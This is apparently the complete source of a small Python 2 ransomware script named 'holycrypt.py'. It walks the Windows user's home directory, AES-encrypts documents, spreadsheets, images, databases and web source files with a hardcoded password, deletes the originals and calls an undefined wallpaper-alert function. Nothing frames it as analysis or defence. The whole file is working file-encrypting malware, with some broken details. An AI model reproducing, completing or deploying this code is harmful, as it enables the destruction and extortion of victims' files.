from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys

def encrypt(key, FileName):
    chunkS = 64 * 1024
    OutputFile = os.path.join(os.path.dirname(FileName), "(encrypted)" + os.path.basename(FileName))
    Fsize = str(os.path.getsize(FileName)).zfill(16)
    IniVect = ''
    
    for i in range(16):
        IniVect += chr(random.randint(0, 0xFF))
        
    encryptor = AES.new(key, AES.MODE_CBC, IniVect)
    
    with open(FileName, "rb") as infile:
        with open(OutputFile, "wb") as  outfile:
            outfile.write(Fsize)
            outfile.write(IniVect)
            while True:
                chunk = infile.read(chunkS)
                
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 !=0:
                    chunk += ' ' * (16 - (len(chunk) % 16)) 
                outfile.write(encryptor.encrypt(chunk))

def decrypt(key, FileName):
    OutputFile = os.path.join(os.path.dirname(FileName), os.path.basename(FileName[11:]))
    chunkS = 64 * 1024
    with open(FileName, "rb") as infile:
        fileS = infile.read(16)
        IniVect = infile.read(16)
        
        decryptor = AES.new(key, AES.MODE_CBC, IniVect)
        
        with open(OutputFile, "wb") as outfile:
            while True:
                chunk = infile.read(chunkS)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(int(fileS))
        

def getDigest(password):
    hasher = SHA256.new(password)
    return hasher.digest()

def files2crypt(path):
    allFiles = []
    for root, subfiles, files in os.walk(path):
        for names in files:
            if names == "holycrypt.py":
                continue
            allFiles.append(os.path.join(root, names))
    return allFiles

def Main():
	username = os.getenv('username')
	path2crypt = 'C:/Users/' + username
	
	valid_extension = [".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"]
	
	choice = 'E'
	password = 'test'
	encFiles = files2crypt(path2crypt)
	if choice == "E":
		for file_pnt in encFiles:
			if os.path.basename(file_pnt).startswith("(encrypted)"):
				print "%s is already ENC" %str(file_pnt)
				pass
			else:
				extension  = os.path.splitext(file_pnt)[1]
				if extension in valid_extension:
					try:
						encrypt(getDigest(password), str(file_pnt))
						os.remove(file_pnt)
					except:
						pass
		set_alert_wallpaper()
    
				
	elif choice == "D":
		filename = raw_input("Filename to DEC: ")
		if not os.path.exists(filename):
			print "Not exist!"
			sys.exit(0)
		elif not filename.startswith("(encrypted)"):
			print "%s is already not DEC" %filename
			sys.exit()
		else:
			decrypt(getDigest(password), filename)
			s = str(getDigest(password))
			os.remove(filename)
			
	else:
		print "Invalid choice!"
		sys.exit
		sys.exit
        
if __name__ == '__main__':
    Main()
